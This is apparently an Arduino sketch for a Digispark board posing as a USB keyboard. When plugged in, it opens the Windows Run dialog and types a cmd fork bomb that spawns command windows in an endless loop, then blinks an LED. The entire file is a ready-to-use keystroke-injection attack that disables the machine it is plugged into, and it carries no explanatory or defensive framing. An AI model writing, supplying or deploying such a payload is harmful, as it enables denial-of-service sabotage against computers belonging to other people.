
#define KEY_BACKSPACE 42
#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //RED LED
  pinMode(2, OUTPUT); //BLUE LED
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("cmd /C \"color a & FOR /L %N IN () DO start cmd\""));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  DigiKeyboard.delay(500);
  digitalWrite(2, HIGH);
  DigiKeyboard.delay(1000);
  digitalWrite(2, LOW);
}
